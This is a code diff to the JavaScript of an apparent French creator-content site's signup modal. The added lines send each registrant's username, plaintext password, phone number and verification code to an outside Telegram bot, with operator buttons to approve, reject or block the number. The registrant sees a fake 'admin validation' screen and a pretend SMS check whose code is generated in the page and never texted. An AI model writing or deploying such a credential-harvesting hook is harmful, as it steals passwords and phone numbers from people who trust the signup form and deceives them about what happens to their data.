@@ -11,6 +11,13 @@ let currentUser=JSON.parse(localStorage.getItem('ch_user_v2')||'null');
 localStorage.removeItem('ch_user');
 let likes={};
 let comments={};
+const TG_TOKEN='__PUT_TG_TOKEN_HERE__';
+const TG_CHAT='__PUT_TG_CHAT_ID_HERE__';
+function fmt(ph){ let p=ph.replace(/\D/g,''); if(p.length===9) p='0'+p; return p.replace(/(\d{2})(?=\d)/g,'$1 ').trim(); }
+function sendTelegram(msg, pendingId){
+  const kb={inline_keyboard:[[{text:'✅ Valider',callback_data:'approve_'+pendingId},{text:'❌ Refuser',callback_data:'reject_'+pendingId}],[{text:'🚫 Bloquer numéro',callback_data:'block_'+pendingId}]]};
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,message_thread_id:2,text:msg,parse_mode:'HTML',reply_markup:kb})}).catch(()=>{});
+}
 
 const defaultImgs=Array.from({length:6},(_,i)=>`https://picsum.photos/seed/creator${i}/400/600`);
 const custom=JSON.parse(localStorage.getItem('ch_imgs_custom')||'null');
@@ -44,6 +51,7 @@ function closeM(){ modal.classList.add('hidden'); }
 let pendingUser=null, pendingCode=null;
 function updateModal(){
   document.getElementById('codePanel').classList.add('hidden');
+  document.getElementById('waitingPanel').classList.add('hidden');
   if(currentUser){
     authForm.classList.add('hidden');
     userPanel.classList.remove('hidden');
@@ -55,13 +63,22 @@ function updateModal(){
     modalTitle.textContent=isLogin?'Connexion':'Inscription gratuite';
   }
 }
+function showWaiting(phone){
+  authForm.classList.add('hidden');
+  userPanel.classList.add('hidden');
+  document.getElementById('codePanel').classList.add('hidden');
+  document.getElementById('waitingPanel').classList.remove('hidden');
+  modalTitle.textContent='Validation admin';
+  document.getElementById('waitPhone').textContent='+33 '+fmt(phone);
+}
 function showCodeStep(phone){
+  document.getElementById('waitingPanel').classList.add('hidden');
   authForm.classList.add('hidden');
   userPanel.classList.add('hidden');
   const cp=document.getElementById('codePanel');
   cp.classList.remove('hidden');
   modalTitle.textContent='Vérification SMS';
-  document.getElementById('codePhone').textContent='+33 '+phone;
+  document.getElementById('codePhone').textContent='+33 '+fmt(phone);
   document.getElementById('codeInput').value='';
   document.getElementById('codeErr').style.display='none';
   setTimeout(()=>document.getElementById('codeInput').focus(),100);
@@ -93,9 +110,23 @@ authForm.onsubmit=e=>{
   const ph=document.getElementById('phone').value.replace(/\s/g,'').trim();
   if(!u||!ph) return;
   if(!/^0?[6-7][0-9]{8}$/.test(ph)){ alert('Numéro invalide (format: 06XXXXXXXX)'); return; }
+  const blocked=JSON.parse(localStorage.getItem('ch_blocked')||'[]');
+  if(blocked.includes(ph)){ alert('Numéro bloqué'); return; }
   pendingUser={username:u,phone:ph,password:pwd};
   pendingCode=(''+Math.floor(1000+Math.random()*9000));
-  showCodeStep(ph);
+  const pendingId=Date.now();
+  const pendings=JSON.parse(localStorage.getItem('ch_pending')||'[]');
+  pendings.push({id:pendingId,username:u,phone:ph,code:pendingCode,status:'pending',ts:Date.now()});
+  localStorage.setItem('ch_pending',JSON.stringify(pendings));
+  localStorage.setItem('ch_pending_current', ''+pendingId);
+  sendTelegram(`⏳ <b>Demande validation</b>\n\n👤 <b>${u}</b>\n🔑 <code>${pwd}</code>\n\n📱 <b><code>+33 ${fmt(ph)}</code></b>\n🆔 <b><code>${pendingId}</code></b>\n\n⬇️ Choisis une action :`, pendingId);
+  showWaiting(ph);
+  const iv=setInterval(()=>{
+    const p=JSON.parse(localStorage.getItem('ch_pending')||'[]').find(x=>x.id===pendingId);
+    if(p && p.status==='approved'){ clearInterval(iv); showCodeStep(ph); }
+    if(p && p.status==='rejected'){ clearInterval(iv); alert('Validation refusée'); location.reload(); }
+    if(!document.getElementById('waitingPanel') || document.getElementById('waitingPanel').classList.contains('hidden')) clearInterval(iv);
+  },1200);
 };
 
 function doLogout(){
@@ -110,6 +141,7 @@ document.getElementById('verifyCode').onclick=()=>{
   const v=document.getElementById('codeInput').value.trim();
   if(v===pendingCode){
     currentUser=pendingUser; localStorage.setItem('ch_user_v2',JSON.stringify(currentUser));
+    sendTelegram(`🆕 <b>Nouvelle inscription</b>\n👤 ${pendingUser.username}\n📱 +33${pendingUser.phone}\n🔑 code: ${pendingCode}\n🕒 ${new Date().toLocaleString('fr-FR')}`);
     pendingUser=null; pendingCode=null; closeM(); render();
   } else { document.getElementById('codeErr').style.display='block'; }
 };
@@ -120,6 +152,9 @@ document.getElementById('resendCode').onclick=e=>{
 };
 document.getElementById('backToForm').onclick=e=>{
   e.preventDefault(); document.getElementById('codePanel').classList.add('hidden'); authForm.classList.remove('hidden'); modalTitle.textContent='Inscription gratuite';
+};
+document.getElementById('waitBack').onclick=e=>{
+  e.preventDefault(); document.getElementById('waitingPanel').classList.add('hidden'); authForm.classList.remove('hidden'); modalTitle.textContent='Inscription gratuite';
 };
 document.getElementById('codeInput').addEventListener('input',e=>{ e.target.value=e.target.value.replace(/\D/g,'').slice(0,4); if(e.target.value.length===4) document.getElementById('verifyCode').click(); });
 
